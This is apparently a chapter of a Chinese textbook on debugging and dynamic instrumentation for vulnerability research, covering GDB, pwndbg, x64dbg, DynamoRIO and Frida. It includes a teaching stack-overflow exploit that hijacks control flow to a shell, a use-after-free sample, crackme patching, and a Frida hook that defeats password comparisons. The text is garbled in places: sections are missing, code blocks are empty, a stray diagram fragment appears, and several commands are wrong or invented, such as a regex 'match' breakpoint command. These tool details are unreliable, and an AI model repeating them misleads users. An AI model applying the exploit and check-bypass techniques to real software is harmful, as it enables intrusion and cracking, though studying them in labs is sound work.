## 6.1 GDB 基础与进阶

GNU Debugger（GDB）是 Linux 平台下最强大的调试工具，也是漏洞挖掘工作者必须熟练掌握的基础工具。本节将从基础命令到高级脚本，全面覆盖 GDB 的使用。

### 6.1.1 GDB 基本命令体系

GDB 的命令体系可以按功能分为几个核心类别：断点控制、执行控制、内存查看、寄存器操作和符号管理。

#### 断点设置

**break（b）**：设置断点是调试的第一步。GDB 支持多种断点设置方式：

```gdb
# 在函数入口设置断点
b main
b vuln_function

# 在指定行号设置断点
b exploit.c:42

# 在指定地址设置断点
b *0x4005c0

# 条件断点
b malloc if size > 1024
b strcpy if strstr($rdi, "flag") != 0
```

条件断点在漏洞挖掘中极为实用。例如，当分析堆溢出漏洞时，可以设置 `b free if size == 0x40`，仅在特定大小的堆块被释放时触发断点，避免无关的 free 调用干扰分析。

**watch**：监视变量或内存地址的变化，当被监视的目标被写入时自动中断：

```gdb
# 监视变量的值变化
watch i
watch buffer[32]

# 监视内存地址（硬件支持）
watch *(int*)0x7fffffffe000

# 只读监视
rwatch *(int*)0x7fffffffe000

# 读写监视
awatch *(int*)0x7fffffffe000
```

硬件监视点（watchpoint）有数量限制（通常 x86-64 架构支持 4 个），但在追踪缓冲区溢出和 Use-After-Free 漏洞时非常有效。当需要定位"谁改写了这个内存地址"时，watch 是最直接的武器。

**catch**：捕获特定事件，不需要指定位置：

```gdb
# 捕获系统调用
catch syscall
catch syscall write    # 只捕获 write 系统调用

# 捕获信号
catch signal SIGSEGV
catch signal SIGABRT

# 捕获 C++ 异常
catch throw
catch catch

# 捕获 fork/exec
catch fork
catch exec
```

在漏洞研究中，`catch syscall` 特别有用——你可以看到程序进行了哪些系统调用，参数是什么，返回了什么。配合 `info args` 和 `info return` 可以获得完整的调用上下文。

**match**：GDB 的 `match` 命令用于动态断点，类似于 `break` 但支持正则表达式匹配函数名：

```gdb
# 匹配所有包含 alloc 的函数
match *_alloc*
# 匹配所有 free 相关函数
match *free*
```

这在逆向大型二进制文件时非常实用，可以一键在所有内存分配/释放函数上设置断点。

#### 执行控制

程序在断点处暂停后，需要精细控制执行流程：

```gdb
# 单步执行（进入函数内部）
step
step 5              # 执行 5 步

# 单步执行（不进入函数）
next
next 5

# 继续执行到下一个断点
continue
c

# 执行到当前函数返回
finish

# 执行到指定行
until 45
until main.c:60

# 临时断点 + 继续
tbreak vuln_func    # 设置临时断点（只触发一次）
continue

# 反向调试（需要记录）
reverse-step
reverse-next
reverse-continue
```

`until` 命令在循环调试中很有价值——当你在一个长循环中确认了前几次迭代的行为后，使用 `until` 可以直接跳出循环，省去逐次按 `next` 的繁琐。

#### 寄存器操作

寄存器是漏洞利用中的核心要素，GDB 提供全面的寄存器操作：

```gdb
# 查看所有寄存器
info registers
info all-registers

# 查看特定寄存器
info registers rax rsp rip eflags

# 查看浮点寄存器
info float

# 查看向量寄存器
info vector

# 修改寄存器值
set $rax = 0xdeadbeef
set $rip = 0x400520
set $rdi = $rsp + 0x100

# 寄存器运算
set $rax = $rax + 0x10
set $rsp = $rsp - 0x200  # 栈上开辟空间
```

修改寄存器是漏洞利用验证的关键步骤。例如，在栈溢出漏洞中，当你覆盖了返回地址后，可以通过 `set $rip = <shellcode_address>` 来模拟控制流劫持，验证利用是否可行，而无需重新运行程序。

#### 内存查看

`x/` 命令是 GDB 中使用频率最高的命令之一，用于查看内存内容：

```gdb
# 基本格式：x/[数量][格式][大小] <地址>

# 以十六进制查看 16 个字
x/16x $rsp

# 以十进制查看 8 个四字
x/8d $rdi

# 以字符串形式查看
x/s 0x400600
x/s $rsp

# 以指令形式反汇编
x/10i $rip
x/3i $rip

# 查看栈帧
x/20gx $rsp

# 格式总结：
# x 十六进制  d 十进制  s 字符串  i 指令
# t 二进制  o 八进制  a 地址  c 字符

# 大小指定：
# b 1字节  h 2字节  w 4字节  g 8字节
```

**内存查看实战技巧**：

```gdb
# 查看函数参数（x86-64 ABI 前6个参数在 rdi, rsi, rdx, rcx, r8, r9）
p/x $rdi          # 第一个参数
x/s $rdi          # 如果第一个参数是字符串

# 查看栈上的局部变量
x/20gx $rsp
info locals

# 从当前指令向后看 20 条指令
x/20i $rip-20

# 查看 vtable（逆向 C++ 虚函数）
x/8gx *(void**)$rdi
```

#### 信息查询

```gdb
# 函数和变量信息
info functions
info functions malloc  # 搜索匹配的函数
info variables

# 断点信息
info breakpoints
info watchpoints

# 共享库
info sharedlibrary

# 线程
info threads
thread 2             # 切换到线程 2

# 帧信息
info frame
info args
info locals
backtrace
backtrace full       # 带局部变量的回溯
```

在分析多线程漏洞时，`info threads` 和 `thread` 命令允许你在不同线程间跳转，检查每个线程的栈状态和寄存器值，定位竞态条件（Race Condition）。

### 6.1.2 GDB 脚本与自动化

脚本化是 GDB 进阶使用的重要环节，能够将重复性操作自动化，提高调试效率。

#### .gdbinit 配置文件

`~/.gdbinit` 文件在 GDB 启动时自动加载，可以设置常用配置和自定义命令：

```gdb
# ~/.gdbinit 示例
set disassembly-flavor intel      # Intel 语法
set pagination off                # 关闭分页
set confirm off                   # 关闭确认
set print pretty on               # 美化打印
set follow-fork-mode child        # 跟踪子进程
set detach-on-fork off            # 不分离父进程

# 显示设置
display/3i $rip                   # 每次暂停显示当前指令
display/x $rax
display/x $rbx

# 自定义命令
define stacktrace
    bt
    info registers rbp rsp rip
    x/10gx $rsp
end

define hexdump
    x/$0xbx $arg0
end

# 历史记录
set history filename ~/.gdb_history
set history save on
set history size 1000

# 自动加载脚本
source ~/gdbscripts/myutils.py
```

#### Python 脚本扩展

GDB 支持 Python 脚本扩展，可以实现极其复杂的调试逻辑：

```python
# gdb_auto_analysis.py - 自动漏洞分析脚本
import gdb
import struct

class FindBufferOverflow(gdb.Command):
    """检测栈缓冲区溢出的命令"""
    
    def __init__(self):
        super().__init__("find_overflow", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        # 获取返回地址
        rbp = int(gdb.parse_and_eval("$rbp"))
        rip_val = int(gdb.parse_and_eval("$rip"))
        
        # 读取栈上的返回地址
        saved_rip_bytes = gdb.selected_inferior().read_memory(rbp + 8, 8)
        saved_rip = struct.unpack("<Q", saved_rip_bytes)[0]
        
        # 检查返回地址是否被改写
        if saved_rip != rip_val:
            print(f"[!] 检测到返回地址被覆盖！")
            print(f"[!] 原始 RIP: 0x{rip_val:016x}")
            print(f"[!] 栈上 RIP: 0x{saved_rip:016x}")
            
            # 计算偏移
            stack_size = rbp - int(gdb.parse_and_eval("$rsp"))
            print(f"[!] 栈帧大小: {stack_size} 字节")
            print(f"[!] 偏移量: {stack_size + 8} 字节到达返回地址")
        else:
            print("[+] 返回地址未被修改")

class AnalyzeHeapChunk(gdb.Command):
    """分析堆块头信息"""
    
    def __init__(self):
        super().__init__("heap_chunk", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        addr = int(arg, 16) if arg else int(gdb.parse_and_eval("$rdi"))
        
        # 读取堆块头
        mem = gdb.selected_inferior().read_memory(addr - 8, 16)
        prev_size, size = struct.unpack("<QQ", mem)
        
        print(f"[+] 堆块地址: 0x{addr:x}")
        print(f"[+] prev_size: {prev_size} (0x{prev_size:x})")
        print(f"[+] size: {size & ~7} (0x{size & ~7:x})")
        
        flags = size & 7
        flag_names = {1: "PREV_INUSE", 2: "IS_MMAPPED", 4: "NON_MAIN_ARENA"}
        for mask, name in flag_names.items():
            if flags & mask:
                print(f"[+] 标志位: {name}")

# 注册自定义命令
FindBufferOverflow()
AnalyzeHeapChunk()

# 拦截异常自动执行
class SegfaultHandler(gdb.Breakpoint):
    def __init__(self):
        super().__init__("*0x400000", temporary=False)
    
    def stop(self):
        print("[!] SIGSEGV 发生！自动分析...")
        gdb.execute("bt")
        gdb.execute("info registers rax rbx rcx rdx rsi rdi")
        gdb.execute("x/10gx $rsp")
        print("[!] 分析完成")
        return True  # 停止在断点处

# 安装自动断点
gdb.execute("catch signal SIGSEGV")
```

将这个脚本保存为 `~/.gdb/segfault_handler.py`，然后在 GDB 中加载：

```gdb
(gdb) source ~/.gdb/segfault_handler.py
(gdb) find_overflow
```

**场景二：自动遍历输入空间**

```python
class FuzzTrace(gdb.Command):
    """自动追踪 fuzz 过程中的崩溃"""
    
    def invoke(self, arg, from_tty):
        # 设置多个观察点
        gdb.execute("catch syscall mmap")
        gdb.execute("catch syscall munmap")
        gdb.execute("catch syscall mprotect")
        
        # 记录内存操作日志
        old_brk = 0
        while True:
            gdb.execute("continue")
            brk = int(gdb.parse_and_eval("$rdi"))
            if brk != old_brk:
                print(f"brk 调整: {old_brk} -> {brk}")
                old_brk = brk
```

### 6.1.3 实战：用 GDB 调试栈溢出

下面通过一个完整的实战示例，展示如何用 GDB 调试和利用栈溢出漏洞。

**漏洞程序**：

```c
/* vuln.c - 包含栈溢出漏洞 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void secret_function() {
    printf("恭喜！你成功劫持了控制流！\n");
    system("/bin/sh");
}

void vulnerable_function(char *input) {
    char buffer[64];
    
    printf("buffer 地址: %p\n", buffer);
    printf("secret_function 地址: %p\n", secret_function);
    
    // 存在栈溢出漏洞
    strcpy(buffer, input);
    
    printf("返回前...\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("用法: %s <input>\n", argv[0]);
        return 1;
    }
    
    vulnerable_function(argv[1]);
    printf("程序正常退出\n");
    return 0;
}
```

编译：

```bash
gcc -fno-stack-protector -no-pie vuln.c -o vuln
```

**调试步骤**：

**步骤 1：确定覆盖偏移**

```gdb
gdb ./vuln
(gdb) disas vulnerable_function
(gdb) b *vulnerable_function+40  # 在 strcpy 调用后设置断点
(gdb) run AAAAAAAA               # 先用短输入运行
```

```gdb
# 使用更聪明的方法确定偏移
(gdb) pattern create 200         # 如果安装了 pwndbg/peda
# 或手动计算
(gdb) p/de $rbp - $rsp           # 计算栈帧大小
$1 = 64
# 所以偏移 = buffer(64) + saved_rbp(8) = 72 字节到达返回地址
```

**步骤 2：获取目标地址**

```gdb
(gdb) p secret_function
$2 = {void ()} 0x400566 <secret_function>
# 目标地址: 0x400566
```

**步骤 3：构造 Exploit**

```python
# exploit.py
import sys

# 填充到返回地址
padding = b"A" * 72

# secret_function 地址
ret_addr = b"\x66\x05\x40\x00\x00\x00\x00\x00"

# 完整的 payload
payload = padding + ret_addr

sys.stdout.buffer.write(payload)
```

**步骤 4：验证 Exploit**

```bash
./vuln "$(python3 exploit.py)"
# 或者通过 GDB 验证
gdb -ex "run $(python3 exploit.py)" ./vuln
```

**步骤 5：GDB 动态验证**（不离开 GDB）

```gdb
(gdb) set args "$(cat payload.txt)"
(gdb) b *vulnerable_function+50   # 在 strcpy 之后
(gdb) r
(gdb) x/gx $rbp+8                 # 检查返回地址
(gdb) x/10i $rbp+8                # 反汇编检查
(gdb) si                          # 单步观察控制流转移
(gdb) stepi
(gdb) info registers rip          # 检查 RIP 是否被劫持
```

### 6.1.4 GDB 高级调试技巧

#### 条件断点与断点命令

```gdb
# 带有自动执行命令的断点
b malloc
commands
    silent
    printf "malloc(%zu) = %p\n", $rdi, $rax
    continue
end

# 仅在特定条件下执行
b *0x400560 if $rax == 0

# 断点忽略（前 100 次不中断）
b strcpy
ignore 1 100
```

#### 远程调试

```gdb
# 目标机运行 gdbserver
$ gdbserver :1234 ./target_program
Process target_program created; pid = 1234
Listening on port 1234

# 调试机连接
(gdb) target remote 192.168.1.100:1234

# 或使用 SSH 隧道
$ ssh -L 1234:localhost:1234 user@target
(gdb) target remote localhost:1234
```

远程调试在嵌入式设备漏洞研究和 IoT 固件分析中极为重要。当漏洞存在于路由器、摄像头等设备时，通常需要在设备上运行 gdbserver，然后从调试机连接。

## 6.2 pwndbg 插件详解

pwndbg 是专为漏洞研究设计的 GDB 插件，提供了大量针对漏洞分析和利用开发的辅助功能。

### 6.2.1 安装与配置

```bash
# 安装 pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# 配置 ~/.gdbinit
```

### 6.2.2 常用命令详解

#### cyclic（查找偏移）

`cyclic` 命令是 pwndbg 最常用的功能之一，用于查找缓冲区溢出到控制字段的偏移量：

```bash
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaa...
```

```bash
# 运行程序并崩溃
pwndbg> run $(cyclic 200)
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400561 in ?? ()

# 查看 RIP 中的偏移模式
pwndbg> cyclic -l 0x6161616c
136
```

`cyclic -l` 自动计算偏移量，返回 `136` 表示 136 字节后到达返回地址。这个功能替代了传统手动计算偏移的繁琐过程，大大提速了利用开发。

#### asmode（汇编语法切换）

### 6.2.3 堆分析实战

下面用 pwndbg 分析一个典型的堆 Use-After-Free 漏洞：

```bash
# 编译漏洞程序

# 调试

pwndbg> run
pwndbg> heap
```

```c
/* uaf.c - Use After Free */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct {
    char name[32];
    int id;
    void (*print_func)();
} User;

void normal_print() {
    printf("Normal user\n");
}

void secret_print() {
    printf("SECRET ACCESS GRANTED!\n");
}

User* users[10];

int main() {
    // 分配 user 对象
    users[0] = (User*)malloc(sizeof(User));
    strcpy(users[0]->name, "Alice");
    users[0]->id = 1;
    users[0]->print_func = normal_print;
    
    // 释放
    free(users[0]);
    
    // UAF: 仍然使用已释放的指针
    users[0]->print_func();  // 崩溃或危险
    
    return 0;
}
```

pwndbg 调试过程：

```bash
pwndbg> b free
pwndbg> run
pwndbg> heap
free chunk:
0x602010	PREV_INUSE size: 0x40

pwndbg> telescope 0x602000
pwndbg> bins
```

## 6.3 x64dbg/x32dbg 详解

x64dbg 是 Windows 平台下最流行的开源调试器，是漏洞研究者在 Windows 上的首选工具。x32dbg 是其 32 位版本。

### 6.3.1 界面布局

x64dbg 的界面分为多个面板，每个面板都有特定用途：

#### CPU 窗口（主窗口）

CPU 窗口是 x64dbg 的核心界面，分为以下子窗口：

| 窗口 | 位置 | 功能 |
|------|------|------|
| 反汇编窗口 | 左上 | 显示当前代码的反汇编指令 |
| 寄存器窗口 | 右上 | 显示 CPU 寄存器值（RAX、RBX、RIP 等） |
| 栈窗口 | 右下 | 显示程序栈的内容 |
| 内存转储窗口 | 左下 | 显示指定内存地址的十六进制内容 |
| 信息栏 | — | 显示当前指令的解释、API 帮助信息 |

**常用快捷键**：

| 快捷键 | 功能 |
|--------|------|
| F2 | 设置/取消断点（软件断点） |
| F7 | 单步步入（Step Into） |
| F8 | 单步步过（Step Over） |
| F9 | 运行（Run） |
| Ctrl+F9 | 执行到返回（Run to Return） |

| `/` | 注释 |

### 6.3.2 断点类型详解

x64dbg 支持三种断点类型，各有不同的应用场景：

#### 软件断点（INT3 断点）

软件断点是最常用的断点类型，通过将目标地址的第一个字节替换为 `0xCC` (INT3) 实现：

```text
# 原始指令                 # 设置断点后
mov eax, 0x100   →     int 3
jmp target             mov eax, 0x100
                       jmp target

特点：
- 无限数量（受内存限制）
- 缺点是会修改代码
- 反调试技术可以检测 INT3
```

设置方式：在 CPU 窗口中选中一行指令，按 F2 或双击地址列。

#### 硬件断点

硬件断点使用 CPU 的调试寄存器（DR0-DR3），不会修改代码：

```text
支持四种类型：
- Execute：执行时触发
- Write：写入时触发
- Read/Write：读取或写入时触发
- I/O：I/O 操作时触发

特点：
- 最多 4 个（受 DR 寄存器限制）
- 不修改代码，难以被检测
- 支持内存访问断点
```

设置方式：右键点击寄存器窗口中的行 → 断点 → 硬件断点，或通过命令：

```text
SetHardwareBreakpoint <address> <type> <size>
```

#### 内存断点

内存断点基于内存页的保护属性，当访问指定内存区域时触发：

```text
类型：
- Access：访问时触发
- Write：写入时触发

特点：
- 可以监视大块内存区域
- 性能开销较大（涉及页表修改）
- 和硬件断点一样不修改代码
```

设置方式：在内存转储窗口中选中区域 → 右键 → 断点 → 内存访问/写入断点。

#### 断点对话框

按 `Ctrl+B` 或菜单 → 断点 → 断点列表，可以集中管理所有断点：

```text
功能：
- 查看/删除/启用/禁用断点
- 设置断点条件
- 设置断点日志
- 断点计数（第 N 次才触发）
```

### 6.3.3 补丁功能

x64dbg 提供强大的补丁功能，可以直接修改二进制并保存。

#### 内联补丁

```text
步骤：
1. 在反汇编窗口中定位到要修改的指令
2. 按 Space 打开汇编修改对话框
3. 输入新的汇编指令
4. 确认修改

示例：修改 JNZ 为 JMP
原始: 75 0A  →  JNZ target
修改: EB 0A  →  JMP target (无条件跳转)
```

#### NOP 指令填充

对于需要消除的检查逻辑，可以用 NOP 填充：

```text
原始指令:
74 0F        JE target         // 条件跳转
48 8B 45 F8  MOV RAX, [RBP-8]  // 后续检查

补丁后:
90           NOP
90           NOP
90           NOP
90           NOP
90           NOP
```

选中要 NOP 的指令 → 右键 → 补丁 → 使用 NOP 填充。

#### 保存补丁

```text
补丁完成后：
1. 右键 → 补丁 → 补丁对话框（或 Ctrl+P）
2. 查看所有已应用的补丁
3. 勾选要保存的补丁
4. 点击"补丁文件"按钮
5. 选择保存路径（通常保存为 xxx_patched.exe）
```

保存补丁时注意：
- 数字签名会被破坏
- 建议保留原始文件的备份
- 补丁只能在同版本二进制上生效

### 6.3.4 符号加载

符号（PDB 文件）对逆向分析至关重要。x64dbg 支持从 Microsoft 符号服务器自动下载 PDB：

```text
配置步骤：
1. 菜单 → 选项 → 偏好设置
2. 在"符号"选项卡中设置：
   - 符号存储路径: C:\Symbols
   - 符号服务器: https://msdl.microsoft.com/download/symbols
3. 加载二进制后自动搜索符号

手动加载：
右键 → 符号 → 加载符号

常用系统 DLL 符号：
ntdll.pdb, kernel32.pdb, kernelbase.pdb

```

手动加载符号命令：


有了符号后，x64dbg 可以显示函数名、结构体定义、参数名等信息，极大提升了逆向效率。

### 6.3.5 实战：用 x64dbg 破解 CrackMe

下面以 x64dbg 破解一个简单的 CrackMe 为例，演示实际调试过程。

**环境准备**：

```text
工具：x64dbg（从 https://x64dbg.com 下载）
目标：CrackMe.exe（自定义的程序，要求输入正确密码）
```

**步骤 1：加载程序**

打开 x64dbg → 文件 → 打开 → 选择 CrackMe.exe。程序自动在系统断点（System Breakpoint）处暂停。

**步骤 2：搜索字符串（分析关键代码）**

右键 → 搜索 → 当前模块 → 字符串：
```
"请输入密码: "
"恭喜，密码正确！"
"密码错误，再试一次！"
```

双击"恭喜，密码正确！"，跳转到引用该字符串的代码。

**步骤 3：分析验证逻辑**

```
00401000 | 68 00304000        | push CrackMe.00403000  | "请输入密码: "
00401005 | E8 XX...           | call <printf>
0040100A | 8D 45 F8           | lea eax, [ebp-8]
0040100D | 50                 | push eax
0040100E | E8 XX...           | call <scanf>            | 读取输入
00401013 | 68 10304000        | push CrackMe.00403010  | "password123"  ← 明文密码
00401018 | FF 75 F8           | push [ebp-8]           | 输入密码
0040101B | E8 XX...           | call <strcmp>           | 比较
00401020 | 85 C0              | test eax, eax
00401022 | 75 0C              | jnz short fail         | 如果不相等则跳转
00401024 | 68 20304000        | push CrackMe.00403020  | "恭喜，密码正确！"
00401029 | E8 XX...           | call <printf>
0040102E | EB 0A              | jmp end
00401030 | 68 30304000        | push CrackMe.00403030  | "密码错误！"
00401035 | E8 XX...           | call <printf>
0040103A |                    | end:
```

**步骤 4：两种破解方法**

**方法一：直接 NOP 掉比较跳转**

选中 `00401022 | 75 0C | jnz short fail` → 按 Space → 改为 `90 90` (NOP NOP) → 应用。

**方法二：修改跳转条件**

```text
将 `jnz` 改为 `je`：
原始: 75 0C → jnz fail
修改: 74 0C → je  fail

逻辑反转：密码正确时跳转到 fail（永远不会发生），密码错误时继续执行到密码正确分支。
```

**步骤 5：保存破解后的文件**

右键 → 补丁 → 补丁对话框 → 勾选修改 → 补丁文件 → 保存为 `CrackMe_cracked.exe`。

## 6.5 DynamoRIO 动态二进制插桩

DynamoRIO 是一个强大的动态二进制插桩框架，可以在程序运行时动态修改和分析二进制代码，无需访问源代码。

### 6.5.1 DynamoRIO 原理

DynamoRIO 的核心概念：

```text
基本块（Basic Block）：
- 一系列连续的指令，入口唯一、出口唯一
- 出口通常是分支指令（jmp、call、ret 等）
- DynamoRIO 以基本块为单位进行插桩

跟踪（Trace）：
- 一组频繁执行的基本块序列
- DynamoRIO 会检测热点路径并构建 trace
- 对 trace 进行优化和执行

代码缓存：
- 插桩后的代码存储在代码缓存中
- 原始代码不被修改
- 程序执行的是缓存中的插桩版本

工作流程：
1. 初始化：DynamoRIO 接管目标进程
2. 基本块构建：执行第一条指令时，构建基本块
3. 插桩：调用客户端回调进行插桩
4. 高速缓存：将插桩后的代码存入缓存
5. 执行：执行缓存中的代码
6. 管理：处理异常、信号、系统调用等
```

### 6.5.2 编写 DynamoRIO 客户端

DynamoRIO 客户端是用 C/C++ 编写的动态链接库，在程序运行时被 DynamoRIO 加载。

#### 客户端框架

```c
/* dr_client.cpp - DynamoRIO 客户端示例 */
#include "dr_api.h"
#include "drmgr.h"
#include "drsyscall.h"

/* 全局计数器 */
static int total_instructions = 0;
static int total_basic_blocks = 0;
static int total_syscalls = 0;

/* 基本块回调 - 每个基本块执行前调用 */
static dr_emit_flags_t 
event_basic_block(void *drcontext, void *tag, instrlist_t *bb,
                  bool for_trace, bool translating, OUT void **user_data)
{
    total_basic_blocks++;
    
    /* 统计基本块中的指令数量 */
    int instr_count = 0;
    for (instr_t *instr = instrlist_first(bb);
         instr != NULL;
         instr = instr_get_next(instr)) {
        instr_count++;
    }
    
    total_instructions += instr_count;
    
    /* 打印基本块信息 */
    dr_printf("Basic Block #%d: %d instructions\n", 
              total_basic_blocks, instr_count);
    
    return DR_EMIT_DEFAULT;
}

/* 跟踪回调 - 执行热路径时调用 */
static dr_emit_flags_t
event_trace(void *drcontext, void *tag, instrlist_t *trace, 
            bool translating)
{
    /* 可以在这里对 trace 进行插桩 */
    return DR_EMIT_DEFAULT;
}

/* 退出回调 */
static void event_exit(void)
{
    dr_printf("\n=== 统计报告 ===\n");
    dr_printf("总计基本块: %d\n", total_basic_blocks);
    dr_printf("总计指令: %d\n", total_instructions);
    dr_printf("总计系统调用: %d\n", total_syscalls);
    
    drsyscall_exit();
    drmgr_exit();
}

/* 系统调用前回调 */
static bool event_syscall_pre(void *drcontext, int sysnum)
{
    total_syscalls++;
    dr_printf("系统调用 #%d: syscall %d\n", total_syscalls, sysnum);
    return true;
}

/* 入口点 */
DR_EXPORT void dr_client_main(client_id_t id, int argc, const char *argv[])
{
    /* 初始化 */
    drmgr_init();
    drsyscall_init();
    
    /* 注册回调 */
    dr_register_exit_event(event_exit);
    drmgr_register_bb_instrumentation_ex_event(
        event_basic_block, NULL, NULL, NULL);
    drmgr_register_trace_instrumentation_event(NULL, event_trace);
    drsyscall_register_pre(event_syscall_pre);
    
    dr_printf("DynamoRIO 客户端已启动!\n");
}
```

#### 指令覆盖率统计

```c
/* coverage.cpp - 指令覆盖率统计客户端 */
#include "dr_api.h"
#include "drmgr.h"
#include <unordered_set>

static std::unordered_set<void*> executed_instructions;
static int total_instructions_in_binary = 0;

static dr_emit_flags_t 
event_app_instruction(void *drcontext, instrlist_t *ilist,
                      instr_t *instr, bool for_trace, 
                      bool translating, void *user_data)
{
    /* 在每条应用指令前插入计数器 */
    void *pc = instr_get_app_pc(instr);
    
    if (executed_instructions.find(pc) == executed_instructions.end()) {
        executed_instructions.insert(pc);
        
        /* 可选：记录首次执行的指令 */
        dr_printf("首次执行: " PFX " ", pc);
        instr_disassemble(drcontext, instr, DR_FILE_STDERR);
        dr_printf("\n");
    }
    
    return DR_EMIT_DEFAULT;
}

static void event_exit(void)
{
    dr_printf("\n=== 覆盖率报告 ===\n");
    dr_printf("已执行指令: %zu\n", executed_instructions.size());
    dr_printf("覆盖率: %.2f%%\n", 
              100.0 * executed_instructions.size() / 
              total_instructions_in_binary);
    
    /* 输出未覆盖的代码区域 */
    dr_printf("未覆盖的指令: %d\n", 
              total_instructions_in_binary - executed_instructions.size());
}
```

#### 内存访问跟踪

```c
/* memtrace.cpp - 内存访问跟踪客户端 */
#include "dr_api.h"
#include "drmgr.h"

static FILE *trace_file;

/* 写内存前的回调 */
static void insert_write_callback(void *drcontext, instrlist_t *ilist,
                                  instr_t *where, opnd_t ref)
{
    /* 在写操作前插入记录代码 */
    dr_insert_clean_call(drcontext, ilist, where,
                         (void*)on_write, false, 2,
                         OPND_CREATE_INTPTR(
                             (ptr_uint_t)dr_get_app_pc(drcontext)),
                         opnd_create_reg(DR_REG_RAX));
}

/* 读内存前的回调 */
static void insert_read_callback(void *drcontext, instrlist_t *ilist,
                                 instr_t *where, opnd_t ref)
{
    dr_insert_clean_call(drcontext, ilist, where,
                         (void*)on_read, false, 2,
                         OPND_CREATE_INTPTR(
                             (ptr_uint_t)dr_get_app_pc(drcontext)),
                         opnd_create_reg(DR_REG_RAX));
}

/* 指令插桩回调 */
static dr_emit_flags_t 
event_bb_analysis(void *drcontext, void *tag, instrlist_t *bb,
                  bool for_trace, bool translating, 
                  OUT void **user_data)
{
    for (instr_t *instr = instrlist_first(bb);
         instr != NULL;
         instr = instr_get_next(instr)) {
        
        /* 检查是否访问内存 */
        if (instr_reads_memory(instr)) {
            for (int i = 0; i < instr_num_srcs(instr); i++) {
                opnd_t src = instr_get_src(instr, i);
                if (opnd_is_memory_reference(src)) {
                    insert_read_callback(drcontext, ilist, instr, src);
                }
            }
        }
        
        if (instr_writes_memory(instr)) {
            for (int i = 0; i < instr_num_dsts(instr); i++) {
                opnd_t dst = instr_get_dst(instr, i);
                if (opnd_is_memory_reference(dst)) {
                    insert_write_callback(drcontext, ilist, instr, dst);
                }
            }
        }
    }
    
    return DR_EMIT_DEFAULT;
}

static void on_read(app_pc addr, reg_t value)
{
    fprintf(trace_file, "READ  @ " PFX " value=" PIFX "\n", addr, value);
}

static void on_write(app_pc addr, reg_t value)
{
    fprintf(trace_file, "WRITE @ " PFX " value=" PIFX "\n", addr, value);
}

DR_EXPORT void dr_client_main(client_id_t id, int argc, const char *argv[])
{
    drmgr_init();
    trace_file = fopen("memtrace.log", "w");
    
    drmgr_register_bb_instrumentation_ex_event(
        event_bb_analysis, NULL, NULL, NULL);
    
    dr_register_exit_event([]() {
        fclose(trace_file);
        drmgr_exit();
    });
}
```

```text
│  │  └───────┘ └───────┘               │ │
```

### 6.6.2 JavaScript API 详解

#### Interceptor.attach - 函数 Hook

这是 Frida 最核心的功能，用于 hook 任意函数的调用：

```javascript
// 基础 Hook - 拦截特定函数
Interceptor.attach(Module.findExportByName(null, "strcmp"), {
    onEnter(args) {
        console.log("[strcmp] str1:", args[0].readCString());
        console.log("[strcmp] str2:", args[1].readCString());
        
        // 修改参数（绕过密码检查）
        if (args[1].readCString().includes("secret")) {
            // 让比较永远返回 0
            args[1] = args[0];
        }
    },
    onLeave(retval) {
        console.log("[strcmp] 返回值:", retval);
        
        // 修改返回值
        retval.replace(0);  // 永远返回"相等"
    }
});

// Hook 带有偏移的导出函数
const libc = Module.findExportByName(null, "libc.so.6");
Interceptor.attach(libc.add(0x1234), {
    onEnter(args) {
        console.log("Called function at offset 0x1234");
    }
});

// Hook 构造函数
const mallocPtr = Module.findExportByName(null, "malloc");
Interceptor.attach(mallocPtr, {
    onEnter(args) {
        this.size = args[0].toInt32();
        console.log(`malloc(${this.size})`);
    },
    onLeave(retval) {
        console.log(`malloc returned ${retval}, size was ${this.size}`);
        
        // 在分配的内存中写入标记
        if (this.size === 0x100) {
            retval.writeByteArray([0x41, 0x42, 0x43, 0x44]);
        }
    }
});
```

#### Memory.scan - 内存搜索

在目标进程的内存中搜索特定模式：

```javascript
// 搜索特定字符串
function findString(pattern) {
    const ranges = Process.enumerateRanges('rw-');
    
    ranges.forEach(range => {
        Memory.scan(range.base, range.size, pattern, {
            onMatch(address, size) {
                console.log(`Found '${pattern}' at: ${address}`);
                console.log(`内容: ${address.readCString()}`);
                
                // 找到后可以修改
                address.writeByteArray([0x00]);
            },
            onComplete() {
                console.log(`Search in ${range.base} completed`);
            }
        });
    });
}

// 搜索字节模式（类似 PE 文件的特征码搜索）
function findPattern(hexPattern) {
    Memory.scan(Process.getModuleByName("target.exe").base, 
                0x100000,  // 搜索前 1MB
                hexPattern,
                {
                    onMatch(address, size) {
                        console.log(`Pattern found at: ${address}`);
                    },
                    onComplete() {
                        console.log("Pattern search complete");
                    }
                });
}

// 搜索所有可执行内存中的特定指令模式
function findCodePattern() {
    const ranges = Process.enumerateRanges('--x');
    const pattern = "48 8B 45 F8 48 89 C7"; // MOV RAX, [RBP-8]; MOV RDI, RAX
    
    ranges.forEach(range => {
        Memory.scan(range.base, range.size, pattern, {
            onMatch(address) {
                console.log(`Code pattern at: ${address}`);
                console.log(`在模块: ${Process.getModuleByAddress(address).name}`);
            },
            onComplete() {}
        });
    });
}
```

## 6.8 总结

本章全面介绍了动态分析技术在漏洞挖掘中的应用，涵盖了从用户态调试到内核调试、从传统调试器到动态插桩的全方位内容。

### 核心要点回顾

**1. GDB 调试（Linux 用户态）**
- 掌握基本断点（break、watch、catch）的执行控制能力
- 熟练使用内存查看（x/命令）和寄存器操作
- 利用 .gdbinit 和 Python 脚本实现自动化调试
- 栈溢出调试的核心是定位偏移、确认劫持点、验证控制流

**2. pwndbg 插件**
- Cyclic 命令是找偏移的利器
- Heap、bins、tcache 命令是堆漏洞分析的必备工具
- Telescope 和 ctx 提供了直观的内存和上下文展示
- 与 GDB 无缝集成，降低漏洞利用开发的门槛

**3. x64dbg（Windows 用户态）**
- 三种断点类型各有适用场景，硬件断点最隐蔽
- 补丁功能允许直接修改并保存二进制
- PDB 符号加载是逆向分析的基础保障
- 条件断点和脚本功能可实现复杂调试逻辑

**4. WinDbg（Windows 内核调试）**
- 双机调试是内核分析的基础（串口或网络）
- `!analyze -v` 是分析 BSOD 崩溃的万能钥匙
